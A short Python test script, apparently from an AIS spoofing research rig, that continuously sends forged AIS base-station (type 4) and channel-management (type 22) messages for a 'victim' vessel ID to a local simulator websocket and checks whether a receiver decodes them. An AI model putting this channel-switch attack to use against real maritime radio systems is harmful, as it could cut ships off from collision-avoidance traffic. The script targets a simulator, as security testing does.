#!/usr/bin/env python3
"""Blast the EXACT M4 + M22 that build_chanmgmt_switch produces, continuously, straight to
the ais-simulator websocket -- the same way the ghost photo loops. This removes every
variable except the payload itself, so we can see whether the witness decodes these two
message types at all.

Run on the attacker Pi (same host that runs rf_session):
    python3 blast_m4_m22.py                     # default ws url
    python3 blast_m4_m22.py ws://127.0.0.1:52002/ws
Watch the witness .nmea for message types 4 and 22. Ctrl-C to stop.
"""
import sys, time, inspect, importlib.util
import ais_encode as enc

# tolerate an older encode_type22 signature without zonesize
_o = enc.encode_type22
if "zonesize" not in inspect.signature(_o).parameters:
    enc.encode_type22 = lambda *a, zonesize=0, **k: _o(*a, **k)

spec = importlib.util.spec_from_file_location("rf_session", "rf_session.py")
rf = importlib.util.module_from_spec(spec)
spec.loader.exec_module(rf)

class Ctx:
    victim_mmsi = 311001178
    victim_lat = 42.35
    victim_lon = -70.90
    class gps:
        lat = 42.35
        lon = -70.90
        speed = 0.0

cells = rf.build_chanmgmt_switch(Ctx(), power=0)     # exact M4 + M22 the switch sends
frames = [(name, bits) for name, pl in cells for bits, _ in pl]
print("frames to blast:", [(n, len(b)) for n, b in frames])

try:
    import websocket
except ImportError:
    print("pip install websocket-client --break-system-packages"); sys.exit(1)

URL = sys.argv[1] if len(sys.argv) > 1 else "ws://127.0.0.1:52002/ws"
ws = websocket.create_connection(URL, timeout=10)
print(f"connected to {URL}; blasting M4 + M22 every 0.5 s. Watch the witness for type 4 and 22. Ctrl-C to stop.")
n = 0
try:
    while True:
        for name, bits in frames:
            if all(c in "01" for c in bits):
                ws.send(bits)
            time.sleep(0.5)
        n += 1
        if n % 10 == 0:
            print(f"  ...still blasting ({n} cycles)")
except KeyboardInterrupt:
    print("\nstopped.")
    ws.close()
